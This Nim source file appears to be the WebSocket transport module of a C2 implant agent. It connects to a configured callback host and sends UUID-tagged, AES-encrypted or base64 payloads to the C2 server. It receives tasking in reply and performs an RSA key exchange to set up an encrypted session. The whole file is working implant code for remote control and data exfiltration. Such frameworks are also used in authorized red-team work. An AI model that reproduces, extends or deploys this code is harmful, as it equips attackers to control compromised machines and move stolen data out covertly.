## WebSocket Profile - WebSocket C2 communication using 'ws' library with blocking waitFor()

import std/[base64, strutils, json, asyncdispatch, random, os]
import ws
import ../config
import ../utils/crypto
# Only import RSA if encrypted exchange is enabled at compile time
const encryptedExchange {.used.} = static: getEnv("ENCRYPTED_EXCHANGE_CHECK", "false").toLowerAscii in ["true", "t"]
when encryptedExchange:
  import ../utils/rsa

when defined(windows):
  import winim/lean

type
  WebSocketProfile* = ref object
    config: Config
    aesKey: seq[byte]
    ws: WebSocket
    connected: bool
    url: string

  WebSocketMessage = object
    data: string

proc buildWebSocketUrl(profile: WebSocketProfile): string =
  ## Build the full WebSocket URL
  var host = profile.config.callbackHost
  let port = profile.config.callbackPort
  # WebSocket uses ENDPOINT_REPLACE instead of POST_URI
  let endpoint = static: getEnv("ENDPOINT_REPLACE", "socket")
  
  # Strip any existing scheme from host
  if host.startsWith("wss://") or host.startsWith("ws://"):
    let protocolEnd = if host.startsWith("wss://") : 6 else: 5
    host = host[protocolEnd..^1]
  elif host.startsWith("https://"):
    host = host[8..^1]
  elif host.startsWith("http://"):
    host = host[7..^1]
  
  # Determine protocol based on port
  let protocol = if port == "443": "wss" else: "ws"
  
  # Build URL
  result = protocol & "://" & host & ":" & port & "/" & endpoint.strip(chars = {'/'})

proc ensureConnection(profile: var WebSocketProfile): bool =
  ## Ensure WebSocket connection is established using blocking waitFor()
  if profile.connected and not profile.ws.isNil:
    return true
  
  try:
    if profile.config.debug:
      echo "[DEBUG] Connecting to WebSocket: ", profile.url
    
    # Use waitFor() to block on async connection
    profile.ws = waitFor(newWebSocket(profile.url))
    profile.connected = true
    
    if profile.config.debug:
      echo "[DEBUG] WebSocket connected successfully"
    
    return true
  except:
    if profile.config.debug:
      echo "[DEBUG] WebSocket connection failed: ", getCurrentExceptionMsg()
    profile.connected = false
    return false

proc newWebSocketProfile*(): WebSocketProfile =
  ## Create a new WebSocket profile
  result = WebSocketProfile()
  result.config = getConfig()
  result.connected = false
  result.url = result.buildWebSocketUrl()

proc send*(profile: var WebSocketProfile, data: string, callbackUuid: string = ""): string =
  ## Send data to C2 server via WebSocket using blocking waitFor()
  let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
  
  if profile.config.debug:
    echo "[DEBUG] === SENDING DATA VIA WEBSOCKET ==="
    # Try to pretty-print JSON if it's valid JSON and small enough
    try:
      let jsonData = parseJson(data)
      # Only show full JSON for small payloads (< 2KB)
      if data.len < 2048:
        echo "[DEBUG] Request JSON:"
        echo jsonData.pretty()
      else:
        # For large payloads, show summary
        echo "[DEBUG] Request: Large payload (", data.len, " bytes)"
        if jsonData.hasKey("action"):
          echo "[DEBUG] Action: ", jsonData["action"].getStr()
        if jsonData.hasKey("responses"):
          echo "[DEBUG] Responses count: ", jsonData["responses"].len
    except:
      # Not JSON or parse error, show raw
      echo "[DEBUG] Request data (first 500 chars): ", data[0..<min(500, data.len)]
  
  # Ensure connection
  if not profile.ensureConnection():
    if profile.config.debug:
      echo "[DEBUG] Failed to establish WebSocket connection"
    return ""
  
  try:
    # Only encrypt if AES key is available AND we have a callback UUID
    var payload: string
    if profile.aesKey.len > 0 and callbackUuid.len > 0:
      if profile.config.debug:
        echo "[DEBUG] Encrypting payload with AES-256-CBC+HMAC"
        echo "[DEBUG] Data length: ", data.len, " bytes"
        echo "[DEBUG] AES key length: ", profile.aesKey.len, " bytes"
        echo "[DEBUG] UUID: ", uuid
      payload = encryptPayload(data, profile.aesKey, uuid)
      if profile.config.debug:
        echo "[DEBUG] Encrypted payload length: ", payload.len, " bytes"
    else:
      # No encryption, just base64(UUID + data)
      if profile.config.debug:
        echo "[DEBUG] Sending unencrypted payload (Base64 only)"
        echo "[DEBUG] Data length: ", data.len, " bytes"
        echo "[DEBUG] UUID: ", uuid
      payload = encode(uuid & data)
      if profile.config.debug:
        echo "[DEBUG] Encoded payload length: ", payload.len, " bytes"
    
    # Create WebSocket message JSON
    let wsMsg = WebSocketMessage(data: payload)
    let jsonStr = $(%*wsMsg)
    
    if profile.config.debug:
      echo "[DEBUG] Sending WebSocket frame to: ", profile.url
      echo "[DEBUG] Frame JSON length: ", jsonStr.len, " bytes"
      if jsonStr.len < 500:
        echo "[DEBUG] Full frame JSON: ", jsonStr
      else:
        echo "[DEBUG] Payload preview (first 100 chars): ", payload[0..<min(100, payload.len)]
    
    # Send using blocking waitFor()
    if profile.config.debug:
      echo "[DEBUG] Sending WebSocket message..."
    
    waitFor(profile.ws.send(jsonStr))
    
    if profile.config.debug:
      echo "[DEBUG] Waiting for response..."
    
    # Receive response using blocking waitFor()
    let frameData = waitFor(profile.ws.receiveStrPacket())
    
    if profile.config.debug:
      echo "[DEBUG] WebSocket response received"
      echo "[DEBUG] Frame data length: ", frameData.len, " bytes"
      echo "[DEBUG] Raw frame data: ", frameData
    
    # Parse JSON response wrapper
    try:
      let frameJson = parseJson(frameData)
      if frameJson.hasKey("data"):
        let respData = frameJson["data"].getStr()
        
        if profile.config.debug:
          echo "[DEBUG] Response data length: ", respData.len, " bytes"
          if respData.len > 0:
            echo "[DEBUG] Response preview (first 100 chars): ", respData[0..<min(100, respData.len)]
          else:
            echo "[DEBUG] Response data is EMPTY!"
        
        # Decrypt response if AES key is available and we have callback UUID
        if profile.aesKey.len > 0 and callbackUuid.len > 0:
          if profile.config.debug:
            echo "[DEBUG] Decrypting response with AES-256-CBC+HMAC"
          result = decryptPayload(respData, profile.aesKey)
          if profile.config.debug:
            echo "[DEBUG] Decrypted response length: ", result.len, " bytes"
        else:
          # No encryption, decode and skip UUID
          if profile.config.debug:
            echo "[DEBUG] Decoding unencrypted response (Base64)"
          let decoded = decode(respData)
          if decoded.len > 36:
            result = decoded[36..^1]
          else:
            result = ""
        
        # Try to parse and pretty-print response JSON
        if profile.config.debug and result.len > 0:
          echo "[DEBUG] === RECEIVED RESPONSE ==="
          try:
            let jsonResp = parseJson(result)
            # Only show full JSON for small responses (< 2KB)
            if result.len < 2048:
              echo "[DEBUG] Response JSON:"
              echo jsonResp.pretty()
            else:
              # For large responses, show summary
              echo "[DEBUG] Response: Large payload (", result.len, " bytes)"
              if jsonResp.hasKey("action"):
                echo "[DEBUG] Action: ", jsonResp["action"].getStr()
              if jsonResp.hasKey("responses"):
                echo "[DEBUG] Responses count: ", jsonResp["responses"].len
              if jsonResp.hasKey("tasks"):
                echo "[DEBUG] Tasks count: ", jsonResp["tasks"].len
          except:
            # Not JSON or parse error, show raw
            echo "[DEBUG] Response data (first 500 chars): ", result[0..<min(500, result.len)]
        
        return result
      else:
        if profile.config.debug:
          echo "[DEBUG] No 'data' field in response JSON"
        return ""
    except:
      if profile.config.debug:
        echo "[DEBUG] Failed to parse response JSON: ", getCurrentExceptionMsg()
      return ""
  
  except:
    if profile.config.debug:
      echo "[DEBUG] WebSocket request failed: ", getCurrentExceptionMsg()
    profile.connected = false
    try:
      profile.ws.close()
    except:
      discard
    return ""

proc close*(profile: var WebSocketProfile) =
  ## Close WebSocket connection
  if profile.connected and not profile.ws.isNil:
    try:
      profile.ws.close()
    except:
      discard
    profile.connected = false

proc setAesKey*(profile: var WebSocketProfile, key: seq[byte]) =
  ## Set the AES encryption key
  profile.aesKey = key

proc hasAesKey*(profile: WebSocketProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc performKeyExchange*(profile: var WebSocketProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  ## Returns (success, newUuid) tuple where newUuid is the callback UUID from server
  ## If encrypted exchange is not required, use the static PSK
  
  # If no encrypted exchange needed, just use the static PSK
  if not profile.config.encryptedExchange:
    if profile.config.debug:
      echo "[DEBUG] No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    # Don't set key yet - will be set after successful checkin
    return (true, "")
  
  # Only compile RSA code if encrypted exchange is enabled at build time
  when not encryptedExchange:
    if profile.config.debug:
      echo "[DEBUG] RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
    return (true, "")
  
  # Check if RSA is available (requires OpenSSL)
  when encryptedExchange:
    if not isRsaAvailable():
      if profile.config.debug:
        echo "[DEBUG] RSA key exchange not available: OpenSSL not found"
        echo "[DEBUG] Use AESPSK (pre-shared key) for encryption instead"
        echo "[DEBUG] Communication will be unencrypted (Base64 only)"
      return (true, "")  # Don't fail, just skip key exchange
    
    if profile.config.debug:
      echo "[DEBUG] === PERFORMING RSA KEY EXCHANGE ==="
    
    try:
      # Generate RSA 4096-bit key pair
      if profile.config.debug:
        echo "[DEBUG] Generating RSA 4096-bit key pair..."
      
      var rsaKey = generateRsaKeyPair(4096)
      
      if not rsaKey.available:
        if profile.config.debug:
          echo "[DEBUG] RSA key generation failed: OpenSSL error"
        return (false, "")
      
      if profile.config.debug:
        echo "[DEBUG] RSA key generated, public key length: ", rsaKey.publicKeyPem.len, " bytes"
      
      # Generate random 20-character session ID
      randomize()
      var sessionId = newString(20)
      for i in 0..19:
        sessionId[i] = char(rand(25) + ord('a'))  # Random lowercase letters
      
      if profile.config.debug:
        echo "[DEBUG] Session ID: ", sessionId
      
      # Build staging_rsa message
      let stagingMsg = %*{
        "action": "staging_rsa",
        "pub_key": encode(rsaKey.publicKeyPem),
        "session_id": sessionId
      }
      
      let stagingStr = $stagingMsg
      
      if profile.config.debug:
        echo "[DEBUG] Sending staging_rsa request..."
      
      # Send with payload UUID (like oopsie does) - base64(UUID + json)
      # Server will respond with base64(UUID + response_json)
      let response = profile.send(stagingStr, profile.config.uuid)
      
      if response.len == 0:
        if profile.config.debug:
          echo "[DEBUG] Key exchange failed: empty response"
        freeRsaKeyPair(rsaKey)
        return (false, "")
      
      if profile.config.debug:
        echo "[DEBUG] Received key exchange response: ", response.len, " bytes"
      
      # Parse response
      let respJson = parseJson(response)
      
      if not respJson.hasKey("session_key") or not respJson.hasKey("uuid"):
        if profile.config.debug:
          echo "[DEBUG] Key exchange failed: missing session_key or uuid in response"
        freeRsaKeyPair(rsaKey)
        return (false, "")
      
      let encryptedSessionKey = decode(respJson["session_key"].getStr())
      let newUuid = respJson["uuid"].getStr()
      
      if profile.config.debug:
        echo "[DEBUG] Encrypted session key length: ", encryptedSessionKey.len, " bytes"
        echo "[DEBUG] New callback UUID: ", newUuid
      
      # Decrypt session key with RSA private key
      let encryptedBytes = cast[seq[byte]](encryptedSessionKey)
      let decryptedKey = rsaPrivateDecrypt(rsaKey, encryptedBytes)
      
      if decryptedKey.len == 0:
        if profile.config.debug:
          echo "[DEBUG] Key exchange failed: RSA decryption failed"
        freeRsaKeyPair(rsaKey)
        return (false, "")
      
      # Truncate to 32 bytes (AES-256 key)
      var aesKey = decryptedKey
      if aesKey.len > 32:
        aesKey.setLen(32)
      
      if profile.config.debug:
        echo "[DEBUG] Decrypted AES key length: ", aesKey.len, " bytes"
      
      # Set the AES key
      profile.setAesKey(aesKey)
      
      # Clean up RSA key
      freeRsaKeyPair(rsaKey)
      
      if profile.config.debug:
        echo "[DEBUG] RSA key exchange completed successfully"
      
      return (true, newUuid)
    
    except:
      if profile.config.debug:
        echo "[DEBUG] Key exchange exception: ", getCurrentExceptionMsg()
      return (false, "")
